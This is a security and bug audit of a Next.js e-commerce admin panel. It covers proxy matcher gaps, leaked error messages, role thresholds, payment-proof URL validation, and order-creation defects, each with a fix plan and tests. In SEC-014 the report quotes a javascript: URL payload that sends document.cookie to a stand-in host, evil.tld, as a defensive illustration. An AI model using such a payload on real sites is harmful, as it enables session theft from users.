config: { matcher: ["/((?!api/auth|_next/static|_next/image|favicon\\.ico|favicon\\.svg|brand/|proofs/|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico)$).*)"] }
```

**Root Cause:**
The matcher was written as "exclude static assets" rather than "include only app routes", and authorization was designed for page navigations only.

**Real-World Failure Scenario:**
Bots enumerate `POST /api/auth/sign-in/email` for `admin@scrubx.pk`; with no throttle a 100k password list completes in minutes. Separately, a future route placed under `/proofs/` or with an image-like suffix silently ships unauthenticated.

**Required Implementation:**

1. Rewrite the matcher as an **inclusion** list of the route segments that exist:
   ```
   matcher: ["/", "/login", "/products/:path*", "/categories/:path*", "/inventory/:path*",
             "/orders/:path*", "/payments/:path*", "/customers/:path*", "/coupons/:path*",
             "/shipping/:path*", "/payment-methods/:path*", "/engraving/:path*",
             "/settings/:path*", "/api/inventory/:path*", "/api/upload/:path*"]
   ```
   Static assets are then never matched by construction; `_next/*` is absent from the list. Keep `/api/auth/:path*` out of the matcher (Better Auth must be reachable) but verify SEC-001 removed the extra routes beneath it.
2. Branch on `pathname.startsWith("/api/")`: return `NextResponse.json({ error: "Unauthorized" }, { status: 401 })` instead of a redirect, so route handlers fail closed even if they omit `{ redirect: false }`.
3. Add rate limiting with **no new dependency**:
   - New `src/server/rate-limit.ts` using an in-memory `Map<string, { count, resetAt }>`.
   - Document the limitation explicitly: per-instance, resets on cold start, not distributed. Acceptable for a single-instance admin panel; a shared store (Redis/Upstash) is a **prerequisite** if deployed multi-instance or serverless.
   - Key by first `x-forwarded-for` hop + route (or user id when authenticated).
   - Apply: sign-in 10/10 min/IP; `/api/upload/auth` 30/10 min/user; mutating Server Actions 60/min/user, wired inside `createSafeAction` (ARCH-003).
4. Preserve `/login` behaviour (authenticated cookie → `/`), but coordinate the stale-cookie case with BUG-032.

**Expected Behavior After Fix:**
Only explicitly listed paths are proxied. Unauthenticated API calls receive `401 JSON`. Sign-in and signature endpoints are throttled. No route can become public by accident.

**Dependencies:**
- **Must land with** SEC-001 (matcher rewrite is where the removal is verified).
- **Enables** ARCH-002.
- **Related** SEC-005.

**Testing Requirements:**
- `curl` every listed route unauthenticated → redirect (pages) / `401` (API).
- `curl /_next/static/...` → served, not redirected.
- `curl /anything.png` → app `404`, not a proxy bypass.
- 11 sign-ins in 10 minutes → `429`.
- Regression: authenticated navigation to all 18 pages works.

**Acceptance Criteria:**
- [x] Matcher is an explicit inclusion list.
- [x] API paths get `401`, not `307`.
- [x] Sign-in and signature endpoints limited.
- [x] Limiter limitation documented.
- [x] All pages reachable when authenticated.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-012 — Raw error messages leaked to the browser

**Priority:** P1
**Category:** Security
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/error.tsx
src/app/global-error.tsx   (new)
src/actions/media.ts
src/views/Login.tsx
```

**Problem Description:**
Three surfaces render backend `error.message` verbatim. PostgreSQL, postgres.js, ImageKit and Better Auth messages can contain table names, constraint names, hosts and library internals.

**Current Implementation:**
- `src/app/error.tsx:25`: `{error.message || "An unexpected error occurred while loading this page."}`
- `src/actions/media.ts` (both actions): `return { success: false, error: error.message || "…" }` — bypasses `toActionError` and therefore the sanitizer in `src/server/errors.ts`.
- `src/views/Login.tsx:46-50`: `setErrorMessage(error.message || "…")` in the catch block.

The rest of the codebase is correct: `createSafeAction` funnels everything through `toActionError`, which maps PG codes `23505`/`23503`/`23514` to generic text. These three are the exceptions. `src/app/global-error.tsx` does not exist.

**Root Cause:**
`src/actions/media.ts` predates `createSafeAction` and takes `FormData`; the two client components treat `Error.message` as user-facing copy.

**Real-World Failure Scenario:**
A DB outage renders `connect ECONNREFUSED 10.0.0.14:6543` in the error boundary, leaking internal topology. A constraint violation surfaces `duplicate key value violates unique constraint "products_slug_key"`, revealing the schema.

**Required Implementation:**

1. `src/app/error.tsx`: render a fixed message plus the `digest` when present:
   ```tsx
   <p>Something went wrong while loading this page. If it persists, contact a Super Administrator.</p>
   {error.digest && <p className="text-[11.5px] text-ink-muted">Reference: {error.digest}</p>}
   ```
   Keep `console.error`.
2. Route `src/actions/media.ts` errors through `toActionError(err)` before returning (preferred over converting to `createSafeAction`, because a `FormData` payload is not a single Zod object and the change should stay minimal).
3. `src/views/Login.tsx`: sanitise only the thrown-exception path. `res.error.message` from `authClient.signIn.email` is curated and may still be displayed.
4. Add `src/app/global-error.tsx` with the same sanitised content, for errors thrown in the root layout.

**Expected Behavior After Fix:**
No database, network or library message reaches the DOM. Users see stable copy; operators get the digest in logs.

**Dependencies:** None. **Related** ARCH-006.

**Testing Requirements:**
- Force an RSC error → generic message + digest.
- Force `uploadServerMediaAction` failure (invalid key) → response contains no key, no host.
- `grep -rn "error\.message" src/app src/views src/actions` → only curated auth paths remain.

**Acceptance Criteria:**
- [ ] `error.tsx` renders no `error.message`.
- [ ] `global-error.tsx` exists and is sanitised.
- [ ] `media.ts` returns sanitised errors.
- [ ] `Login.tsx` sanitises the catch path.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### SEC-013 — Store settings mutation requires `admin` instead of `super_admin`

**Priority:** P0
**Category:** Security
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/actions/settings.ts
src/server/services/settings.service.ts
src/app/settings/page.tsx
src/components/layout/sidebar.tsx
src/app/layout.tsx
docs/ai-context/AUTH_CONTEXT.md
```

**Problem Description:**
Store-wide configuration is documented (in `AUTH_CONTEXT.md` and in the service's own docblocks) as a Super Administrator capability. The code enforces only `admin` at both layers, so a plain `admin` can change any `store_settings` key. The Settings page is reachable by `staff`, who see the whole configuration UI and fail only at submit.

**Current Implementation:**
- `src/actions/settings.ts:45,68`: `requiredRole: "admin"` on `updateStoreSettingAction` and `updateStoreSettingsBatchAction`.
- `src/server/services/settings.service.ts:84,103`: `assertRole(admin, ["admin"])`; the docblocks above still say "Strictly requires administrator (admin or super_admin) privileges."
- `src/app/settings/page.tsx:19`: `requireStaffContext()` — any staff can load the page.
- Read paths (`getAllSettings`, `getSetting`) correctly require `staff`.
- `src/components/layout/sidebar.tsx:69` renders the Settings link to everyone.

**Root Cause:**
The role threshold was set to the level that made the feature usable during development and never tightened to the documented policy; the docblock and the assertion disagree and the assertion won.

**Real-World Failure Scenario:**
A staff member edits the store's support phone and bank account holder name (keys consumed by the storefront) and saves. The change is accepted and customers are told to transfer funds to a fraudulent account. No audit record exists (ARCH-006).

**Required Implementation:**

1. `src/actions/settings.ts`: `requiredRole: "super_admin"` on both mutating actions.
2. `src/server/services/settings.service.ts`: `assertRole(admin, ["super_admin"])` in `updateSetting` and `updateSettingsBatch`; correct both docblocks.
3. `src/app/settings/page.tsx`: use `requireSuperAdminContext()` (already exported from `src/server/auth.ts`). Keep the read service at `staff`.
4. Hide the sidebar link unless `role === "super_admin"` — only after the server check exists (Safety Rule 6). Pass the role into `AppShell` from `src/app/layout.tsx` (it already computes `admin` at line 56).
5. Record the capability matrix in `docs/ai-context/AUTH_CONTEXT.md`: reads = staff; catalog/orders/payments/stock mutations = admin; settings, staff management and destructive deletes = super_admin. This matrix is the reference for TEST-002.
6. Cross-check the full action inventory in §6.1.1 to ensure no other action is mis-levelled in either direction.

**Expected Behavior After Fix:**
`admin` receives `FORBIDDEN` from both mutations and cannot load `/settings`. `super_admin` succeeds. `staff` never sees the link.

**Dependencies:**
- **Depends on** SEC-004.
- **Related** ECOM-005.

**Testing Requirements:**
- `super_admin` saves a setting → success, persisted.
- `admin` calls the action directly → `FORBIDDEN`, value unchanged.
- `staff` opens `/settings` → `/login?error=forbidden`.
- Sidebar link visibility matches role.
- Regression: `/settings` renders fully for `super_admin`.

**Acceptance Criteria:**
- [x] Both actions require `super_admin`.
- [x] Both service methods assert `super_admin`.
- [x] Page uses `requireSuperAdminContext`.
- [x] Docblocks and `AUTH_CONTEXT.md` agree with the code.
- [x] Capability matrix documented.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-014 — Payment proof URL is an unvalidated client string; proof assets are public

**Priority:** P1
**Category:** Security
**Severity:** Medium
**Verification Status:** Confirmed (asset absence: Confirmed)

**Affected Files:**
```
src/server/validation/payments.ts
src/lib/dto.ts
src/scripts/seed-database.ts
src/views/Payments.tsx
src/views/OrderDetail.tsx
public/proofs/
```

**Problem Description:**
Two coupled problems.

(a) `submitPaymentProofSchema.proofUrl` is `z.string().trim().optional().nullable()` — no URL validation, no scheme restriction, no origin restriction. It is stored in `payments.proof_url` and later rendered as an image/link. `javascript:` and external URLs are accepted.

(b) The codebase assumes proofs live at public paths: `dto.toPaymentSubmissionDTO` falls back to `/proofs/receipt-1.jpg` (line 388), and the seed inserts the same path twice (lines 552, 609). **That file does not exist** — `public/proofs/` contains only `proof-bank.png`, `proof-easypaisa.png`, `proof-jazzcash.png` (instruction graphics). Real proofs are financial PII and must never be publicly addressable.

**Current Implementation:**
- Validation: `proofUrl: z.string().trim().optional().nullable()`, `imagekitFileId: z.string().trim().optional().nullable()` — unconstrained.
- `dto.ts:388`: `proofUrl: (p as any).proofUrl || (p as any).proofImageUrl || "/proofs/receipt-1.jpg"`.
- `seed-database.ts:552,609`: `proofUrl: "/proofs/receipt-1.jpg"`.
- `public/proofs/` has three instruction PNGs and no access control; anything under `public/` is served by Next.js and is also excluded from the proxy (SEC-011).

**Root Cause:**
The proof was modelled as "a URL someone typed" rather than "a reference to an ImageKit object owned by this payment". The seed's placeholder was never created, and the DTO hides the absence with a fallback.

**Real-World Failure Scenario:**
`proofUrl = "javascript:fetch('//evil.tld?c='+document.cookie)"` is accepted and may execute if rendered as a link/iframe. Separately, files stored under `public/proofs/` expose customer bank screenshots to anyone who guesses filenames.

**Required Implementation:**

1. Tighten `submitPaymentProofSchema`:
   ```ts
   proofUrl: z.string().trim().url().max(2048)
     .refine((u) => u.startsWith(`${process.env.NEXT_PUBLIC_IMAGEKIT_URL_ENDPOINT}/`),
             "Proof must be hosted on the ScrubX media CDN.")
     .optional().nullable(),
   imagekitFileId: z.string().trim().regex(/^[a-zA-Z0-9_-]+$/).max(128).optional().nullable(),
   ```
   Require at least one of `proofUrl` / `imagekitFileId` when the method has `supportsProof` — enforce in `payment.service.submitPaymentProof`, which has the method row.
2. Render proofs with `next/image` only (never `<a href>` to an unvalidated URL), routed through `getImageKitUrl` (`src/lib/imagekit-url.ts`), which already preserves only known hosts.
3. Remove the `/proofs/receipt-1.jpg` fallback from `dto.ts:388`; return `undefined` and let the existing empty state render. Fix the seed to omit `proofUrl` (preferred — a seeded paid payment needs no screenshot).
4. Record the storage policy in `docs/ai-context/IMAGEKIT_CONTEXT.md`: new proofs go to `/scrubx/payment-proofs`; if the ImageKit plan supports private files, use them, otherwise document honestly that the CDN URL is unguessable-but-public. Never store customer proofs in `public/`.
5. Data audit query §8.2 Q7 lists payments whose `proof_url` does not start with the CDN endpoint — **requires production read access; Not Verified until run**.

**Expected Behavior After Fix:**
Only ImageKit-hosted proof URLs are accepted. No `javascript:`/external URL reaches the DOM. Missing proofs render an empty state. Real proofs are never served from `public/`.

**Dependencies:**
- **Depends on** SEC-005/SEC-007.
- **Related** BUG-029.

**Testing Requirements:**
- `javascript:alert(1)` → `VALIDATION_ERROR`.
- `https://evil.tld/x.jpg` → `VALIDATION_ERROR`.
- Valid CDN URL → accepted.
- Neither value on a `supportsProof` method → `VALIDATION_ERROR`.
- Proof-less payment renders the empty state with no request to `/proofs/receipt-1.jpg`.
- Seed run → no reference to a missing file.

**Acceptance Criteria:**
- [x] Proof URL validated against the CDN endpoint and scheme.
- [x] `dto.ts` fallback removed.
- [x] Seed no longer references `receipt-1.jpg`.
- [x] No 404s for `/proofs/receipt-1.jpg`.
- [x] Storage policy documented.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

## 6.2 Functional Bugs

---

### BUG-001 — Order creation verifies the customer against the `orders` table

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/repositories/customer.repository.ts
```

**Problem Description:**
`createOrder` resolves `customerId`, then "verifies" it by selecting from the **`orders`** table using the customer's UUID. The query can never match (an order ID is not a customer ID), the result is discarded, and no `NotFoundError` is raised. A non-existent or arbitrary `customerId` therefore passes validation, and the subsequent insert fails only if a foreign-key violation happens to surface — or, worse, creates an order attributed to a valid-but-unrelated customer ID supplied by the caller.

**Current Implementation:**
`src/server/services/order.service.ts:144-157`:
```ts
if (!customerId) {
  throw new ValidationError("Customer identification is required.");
}

// Verify customer exists
const [custRecord] = await tx
  .select()
  .from(orders)             // ← wrong table
  .where(eq(orders.id, customerId))
  .limit(1);
```
`custRecord` is never read afterwards. `orders` and `customers` are imported at the top of the file, so this is not a missing import — it is a wrong table reference.

**Root Cause:**
The block was likely copy-pasted from the idempotency lookup immediately above it (which correctly queries `orders.idempotency_key`) and the table was never switched. Because the result was unused, TypeScript and ESLint had no reason to complain.

**Real-World Failure Scenario:**
A staff member creates an order from the manual-order flow with `customerId` set to a stale/incorrect value (e.g. a customer deleted after the form loaded). Instead of a clean "customer not found", the insert violates `orders.customer_id → customers.id` and the user receives the generic `FOREIGN_KEY_VIOLATION` message, with no indication which field is wrong. If the caller supplies another *valid* customer's UUID, the order is silently attributed to the wrong person, corrupting their order history and lifetime-spend figures.

**Required Implementation:**

1. Replace the query with the correct table and **use** the result:
   ```ts
   const [custRecord] = await tx
     .select({ id: customers.id })
     .from(customers)
     .where(eq(customers.id, customerId))
     .limit(1);
   if (!custRecord) {
     throw new NotFoundError("Customer", customerId);
   }
   ```
2. Place it after the `upsertCustomer` resolution so both paths (existing ID, newly upserted customer) are covered. For the upsert path the row is guaranteed to exist; skip the redundant SELECT there by checking `input.customerId` instead of `customerId`.
3. Import `customers` from `../../db/schema/index.ts` (verify it is exported — it is, alongside `orders`).
4. Do not add caching; this runs inside the order transaction where freshness matters.

**Expected Behavior After Fix:**
Creating an order with an unknown `customerId` fails fast with `NOT_FOUND` and a clear message before any insert. Creating an order with a valid `customerId` links to the intended customer only.

**Dependencies:**
- **Related** DB-001 (`upsertCustomer` atomicity), BUG-004 (same transaction, see §12 ordering).

**Testing Requirements:**
- Normal: valid `customerId` → order created, `orders.customer_id` matches.
- Failure: random UUID → `NOT_FOUND`, zero rows written (assert `count(orders)` unchanged).
- Failure: `customerId` belonging to a different customer → order attributed to the supplied ID (this is the caller's intent) and no cross-contamination.
- Edge: `customer.email` path (no `customerId`) still upserts and creates exactly one order.

**Acceptance Criteria:**
- [ ] The verification selects from `customers`.
- [ ] The result is used and throws `NotFoundError`.
- [ ] Unknown IDs produce no partial writes.
- [ ] `grep -n "from(orders)" src/server/services/order.service.ts` shows only the idempotency lookup.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-002 — Draft and soft-deleted products, and inactive variants, can be ordered

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/db/schema/catalog.ts
src/server/validation/orders.ts
```

**Problem Description:**
Order creation loads variant/product rows and rejects only products whose status is `archived`. It does not check `products.deletedAt` (soft delete), `products.status === "draft"`, or `product_variants.is_active`. Soft-deleted and draft products, and deactivated variants, are therefore purchasable.

**Current Implementation:**
`src/server/services/order.service.ts:176-201`:
```ts
const variantRows = await tx
  .select({
    variantId: productVariants.id,
    sku: productVariants.sku,
    price: productVariants.price,
    size: productVariants.size,
    colorName: productColors.name,
    productName: products.name,
    productStatus: products.status,   // ← only status, no deletedAt, no variant.isActive
    quantityOnHand: inventory.quantityOnHand,
    quantityReserved: inventory.quantityReserved,
  })
  .from(productVariants)
  .innerJoin(products, eq(productVariants.productId, products.id))
  .leftJoin(productColors, eq(productVariants.colorId, productColors.id))
  .leftJoin(inventory, eq(productVariants.id, inventory.variantId))
  .where(inArray(productVariants.id, variantIds));

…
if (v.productStatus === "archived") {
  throw new ValidationError(`Product '${v.productName}' is archived and cannot be ordered.`);
}
```
`productVariants.isActive` exists (`src/db/schema/catalog.ts:36`, `is_active boolean NOT NULL DEFAULT true`) and is used elsewhere (`dto.ts:99`, `product.service.ts:410-418` deactivates variants instead of deleting them when order history exists). `products.deletedAt` exists (`catalog.ts:57`) and `ProductRepository.findPaginated` filters on it — but order creation does not.

**Root Cause:**
The status check was written as a single equality test against the one status the author had in mind (`archived`), instead of an allowlist of orderable states. Soft delete and variant deactivation were added later and the order path was not revisited.

**Real-World Failure Scenario:**
An admin archives variant "Navy / XL" (soft-deactivated because it was discontinued) but the storefront or a staff member still has it in an open cart. The order is accepted, stock is reserved from a variant that will never ship, and the customer receives an order for a discontinued item. Worse: a *soft-deleted* product (deleted via `archiveProduct`, which sets `deletedAt`) remains orderable because `status` may be `"active"` while `deletedAt` is set — the product is invisible in the admin list but can still be sold.

**Required Implementation:**

1. Add `isActive: productVariants.isActive` and `deletedAt: products.deletedAt` to the select.
2. Replace the single check with an explicit allowlist:
   ```ts
   if (v.deletedAt !== null) {
     throw new ValidationError(`Product '${v.productName}' is no longer available.`);
   }
   if (v.productStatus !== "active") {
     throw new ValidationError(
       `Product '${v.productName}' is not available for ordering (status: ${v.productStatus}).`
     );
   }
   if (!v.isActive) {
     throw new ValidationError(`The selected variant of '${v.productName}' is no longer available.`);
   }
   ```
3. Keep the message wording consistent with the existing `ConflictError` style for stock.
4. Consider (do not implement in this issue) whether a `draft` product should be orderable by `super_admin` in a staging context — record the question; the default and safe answer is no.

**Expected Behavior After Fix:**
Only `products.status = 'active'`, `products.deleted_at IS NULL`, `product_variants.is_active = true` rows can be added to an order. Every other state yields `VALIDATION_ERROR` naming the product and the reason.

**Dependencies:**
- **Related** BUG-001 (same validated block), BUG-006 (status bypass), SEC-004 (who can call `createOrder`).

**Testing Requirements:**
- Normal: active product + active variant → order succeeds.
- Failure: `status='draft'` → rejected.
- Failure: `status='archived'` → rejected (unchanged behaviour).
- Failure: `deleted_at` set, `status='active'` → rejected.
- Failure: `variant.is_active=false` → rejected.
- Failure: mixed cart (one valid, one inactive) → entire order rejected, no partial reservation.

**Acceptance Criteria:**
- [ ] All three conditions enforced.
- [ ] Rejection happens before any inventory reservation.
- [ ] Error messages name the product and the reason.
- [ ] Existing valid orders unaffected.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-003 — Invalid or inactive shipping methods grant free shipping

**Priority:** P0
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/db/schema/shipping.ts
src/server/validation/orders.ts
```

**Problem Description:**
Shipping cost is computed inside `if (sm) { … }`. If the supplied `shippingMethodId` does not exist — or exists but is deactivated, or is soft-deleted — the block is skipped, `shippingTotal` stays `0`, and the order is created with **free shipping** and `shipping_method_name = null`. There is no `isActive` check anywhere in the branch.

**Current Implementation:**
`src/server/services/order.service.ts:258-275`:
```ts
let shippingTotal = 0;
let shippingMethodName: string | null = null;
if (input.shippingMethodId) {
  const [sm] = await tx
    .select()
    .from(shippingMethods)
    .where(eq(shippingMethods.id, input.shippingMethodId))
    .limit(1);

  if (sm) {                       // ← no else; no isActive check
    shippingMethodName = sm.name;
    const priceNum = Number(sm.price);
    const freeAboveNum = sm.freeAbove ? Number(sm.freeAbove) : null;
    if (freeAboveNum !== null && subtotal >= freeAboveNum) {
      shippingTotal = 0;
    } else {
      shippingTotal = priceNum;
    }
  }
}
```
`shippingMethods.isActive` exists (`src/db/schema/shipping.ts:34`).

**Root Cause:**
The `if (sm)` guard was written defensively ("no method selected ⇒ no shipping charge") and silently conflated three distinct cases: *no method supplied*, *method not found*, and *method found*. Only the first is legitimately free.

**Real-World Failure Scenario:**
A staff member creates an order and the shipping dropdown sends a stale ID (the method was deactivated after the page loaded). The order is accepted with `shipping_total = 0.00` and no method recorded. The customer pays PKR 250 less than owed, the courier label cannot be generated because there is no method name, and finance reconciliation cannot explain the shortfall.

**Required Implementation:**

1. Decide and encode the three cases explicitly:
   - `shippingMethodId` is `null`/omitted: the schema permits it (`shippingMethodId: uuidSchema.optional().nullable()`). Treat as "no shipping charged" **only** for a documented pickup/local case; otherwise make the field required in `createOrderSchema` when the store requires shipping. Recommendation: keep optional, set `shippingTotal = 0`, and leave `shippingMethodName = null` — but log it.
   - `shippingMethodId` supplied but **not found**: `throw new NotFoundError("Shipping method", input.shippingMethodId)`.
   - Found but `!sm.isActive`: `throw new ValidationError("Selected shipping method is inactive.")`.
2. Compute `freeAbove` only after the above checks.
3. Return the resolved method name and price to the caller so the UI can display exactly what was charged.
4. Add a DB CHECK (DB-004) that `orders.shipping_total >= 0` already holds; no new constraint needed here.

**Expected Behavior After Fix:**
A bogus or inactive `shippingMethodId` cannot produce a free-shipping order; it produces a validation/not-found error. A genuinely omitted method still yields `0.00` and `null` name.

**Dependencies:**
- **Related** BUG-001/BUG-002 (same validated block), BUG-004 (transaction shape).

**Testing Requirements:**
- Normal: active method with `freeAbove` met → `0.00` + name recorded.
- Normal: active method below `freeAbove` → `price` charged + name recorded.
- Failure: random UUID → `NOT_FOUND`, no order created.
- Failure: deactivated method → `VALIDATION_ERROR`.
- Edge: no method → `0.00`, `null` name, order created (documented behaviour).

**Acceptance Criteria:**
- [ ] Missing method ⇒ error, never `0.00`.
- [ ] Inactive method ⇒ error.
- [ ] `freeAbove` still applied correctly.
- [ ] `shipping_method_name` populated whenever a method is supplied.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-004 — Inventory rows locked in arbitrary order; duplicate variant lines unaggregated

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/services/inventory.service.ts
src/server/repositories/inventory.repository.ts
docs/ai-context/DECISIONS.md
```

**Problem Description:**
Two defects in the reservation loop.

(a) **Lock ordering.** `reserveStock` is called once per input item, iterating `input.items` in client-supplied order. Two concurrent orders containing the same two variants in opposite order will each hold one row lock and wait for the other — a textbook deadlock. ADR 018/020 require a deterministic lock order; the code satisfies the *table* order (inventory) but not the *row* order.

(b) **Duplicate lines.** The same `variantId` may appear twice in `items` (the Zod schema only requires `min(1)` and does not deduplicate). Each occurrence issues a separate `reserveStock` call: two lock acquisitions, two `inventory_movements` rows, and — critically — the per-line availability check is evaluated against a value that changes mid-loop, so the combined quantity can exceed availability in ways that are hard to reason about (the second call re-reads `quantity_reserved` that the first call just increased, so it usually fails late with a confusing message).

**Current Implementation:**
`src/server/services/order.service.ts:277-282`:
```ts
// 7. Dual-Counter Inventory Reservation (Locks inventory rows first per ADR 020)
for (const itemInput of input.items) {
  await this.invService.reserveStock(itemInput.variantId, itemInput.quantity, undefined, tx);
}
```
`src/server/services/inventory.service.ts:202-231` (`reserveStock`) does `findForUpdateByVariantId` → compute `available = quantityOnHand - quantityReserved` → `updateInventoryRow` → `insertMovement`.

**Root Cause:**
The reservation primitive was designed for single-variant use (an internal API), and `createOrder` reused it in a loop without normalising the input. Row-level ordering was never specified because the single-variant case has only one row.

**Real-World Failure Scenario:**
Two staff members place orders during a flash sale for the same two SKUs. Postgres detects the lock-order cycle and kills one transaction with `deadlock detected` (SQLSTATE `40P01`). The user sees a generic `INTERNAL_SERVER_ERROR`; the order is not created and no actionable message is shown. Retrying usually works, which hides the defect until it happens under load — exactly when it matters.

**Required Implementation:**

1. **Normalise the cart** before any lock acquisition:
   ```ts
   const aggregated = new Map<string, number>();
   for (const item of input.items) {
     aggregated.set(item.variantId, (aggregated.get(item.variantId) ?? 0) + item.quantity);
   }
   const lockOrder = [...aggregated.keys()].sort();   // deterministic UUID order
   ```
   Use `aggregated` for both the availability loop and the reservation loop, and build `orderItemsToInsert` from the aggregated quantities (variant snapshots are per-variant, so line items become one per variant — confirm this is acceptable product-wise; it is the only correct representation given `order_items` has no per-line uniqueness constraint but the FSM replenishes per line).
2. Acquire all inventory locks in `lockOrder` sequence in a single pass:
   ```ts
   for (const variantId of lockOrder) {
     await this.invService.reserveStock(variantId, aggregated.get(variantId)!, undefined, tx);
   }
   ```
3. Add an explicit note to `docs/ai-context/DECISIONS.md` extending ADR 020: "within a table, rows are locked in ascending primary-key order; multi-row operations must sort keys before locking."
4. Do the same normalisation in `updateOrderStatus`'s commit/cancel loops (they iterate `itemsList` from the DB, which is deterministic by `created_at`, but sorted-by-variant is stricter and free).
5. Surface deadlock errors as retryable: map SQLSTATE `40P01` and `40001` in `toActionError` to `{ code: "CONFLICT", error: "The system was busy processing a concurrent change. Please retry." }` (see DB-012 for the DB-level counterpart).

**Expected Behavior After Fix:**
A cart with duplicate variant lines produces one line item with the summed quantity, one reservation, one movement row. Concurrent orders touching overlapping variants cannot deadlock, because both sort by variant UUID. A genuine serialization failure returns a retryable message instead of a 500.

**Dependencies:**
- **Depends on** nothing conceptually, but must land in the same change set as BUG-001/BUG-002/BUG-003 to avoid three conflicting edits of `createOrder`.
- **Related** DB-012, ADR 020.

**Testing Requirements:**
- Unit: aggregation of `[{A,1},{A,2},{B,1}]` → `{A:3,B:1}`, two lock calls in `[A,B]` order.
- Integration: two concurrent transactions reserving `[A,B]` and `[B,A]` → neither deadlocks (run 100 iterations).
- Integration: duplicate lines → availability checked against the sum, one movement row.
- Failure: sum exceeds availability → single clear `CONFLICT` naming the shortfall.
- Regression: single-variant orders unchanged.

**Acceptance Criteria:**
- [ ] Cart aggregated by `variantId`.
- [ ] Inventory locks acquired in sorted order.
- [ ] Duplicate lines produce one line item and one movement.
- [ ] Deadlock/serialization failures mapped to a retryable error.
- [ ] ADR updated.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-005 — Order number is generated in application code, overriding the DB sequence

**Priority:** P0
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
supabase/migrations/20261105000000_initial_schema.sql
src/db/schema/orders.ts
```

**Problem Description:**
`createOrder` writes `orderNumber: \`SX-${Date.now().toString().slice(-6)}\`` with a comment claiming "Trigger will replace with sequence if omitted". The trigger does the opposite: it only generates a number when `NEW.order_number IS NULL OR NEW.order_number = ''`. Because the application supplies a value, the trigger is bypassed and order numbers become a **timestamp fragment** — 6 digits of milliseconds — which wrap and collide.

**Current Implementation:**
Application, `src/server/services/order.service.ts:309`:
```ts
orderNumber: `SX-${Date.now().toString().slice(-6)}`, // Trigger will replace with sequence if omitted
```
Database, `supabase/migrations/20261105000000_initial_schema.sql:21-31`:
```sql
CREATE SEQUENCE IF NOT EXISTS order_number_seq START WITH 1001;

CREATE OR REPLACE FUNCTION generate_order_number()
RETURNS TRIGGER AS $$
BEGIN
  IF NEW.order_number IS NULL OR NEW.order_number = '' THEN
    NEW.order_number = 'SX-' || nextval('order_number_seq');
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```
and `orders.order_number text NOT NULL UNIQUE` (line 366). `Date.now().toString().slice(-6)` yields `000000`–`999999`, repeating every 1,000,000 ms ≈ 16.7 minutes; modulo collisions are certain within any busy period. The resulting duplicate raises `23505`, which `toActionError` renders as "A record with this identifier already exists." — an error the user cannot act on.

`PROJECT_OVERVIEW.md` documents the intended behaviour: "automated sequential order numbers (`SX-1001`)". The implementation contradicts the documented design.

**Root Cause:**
A workaround was added to satisfy `NOT NULL` on the column (which is not actually required before the BEFORE INSERT trigger runs, since the trigger assigns the value), and the comment describing the trigger's condition was inverted.

**Real-World Failure Scenario:**
Two orders are created 16.7 minutes apart at the same millisecond offset → identical `SX-482913` → the second insert fails with a unique-violation that staff read as "a record with this identifier already exists" and cannot resolve. Alternatively, an operator scanning orders sees a non-monotonic sequence (`SX-999998` followed by `SX-000042`), breaks the invoice numbering assumption, and the packing-slip flow (ECOM-007) prints numbers that sort incorrectly.

**Required Implementation:**

1. Omit `orderNumber` from the insert payload so the trigger always supplies it. In Drizzle, `NewOrder` requires the field because the column is `NOT NULL` — handle this by:
   - generating in the service via the sequence with an explicit, atomic statement:
     ```ts
     const [{ orderNumber }] = await tx.execute(
       sql`SELECT 'SX-' || nextval('order_number_seq') AS "orderNumber"`
     );
     ```
     then pass that value. This keeps the column `NOT NULL` (no schema churn) and uses the same sequence the trigger uses. **Prefer this option** — it is explicit, testable, and avoids relying on insert-time trigger magic.
2. Remove the `Date.now()` expression and the incorrect comment.
3. Add a retry-on-`23505` guard for the (now virtually impossible) sequence race: if the insert fails with `23505` **and** the constraint is `orders_order_number_key`, re-read the sequence once and retry. Do not swallow other `23505` errors.
4. Verify the sequence's current value against `MAX(order_number)` on the target database (§8.2 Q3) — **requires DB access; Not Verified until run** — and, if the application has already written timestamp numbers, advance the sequence past them before switching:
   ```sql
   SELECT setval('order_number_seq', GREATEST((SELECT COALESCE(MAX(NULLIF(regexp_replace(order_number,'\D','','g'),''))::bigint,1000) FROM orders), 1000) + 1, false);
   ```
   Document this as a **data-preservation** step; it does not rewrite existing numbers.
5. Keep the trigger in place as a defence for any future insert path that omits the column (harmless).

**Expected Behavior After Fix:**
Every order receives a monotonically increasing `SX-<sequence>` number from `order_number_seq`, matching the documented `SX-1001` format. No order creation fails with an unexplained unique violation.

**Dependencies:**
- **Related** DB-008 (data audit for existing collisions), DB-015 (migration bookkeeping).
- **Blocks** ECOM-007 (invoices rely on stable numbering).

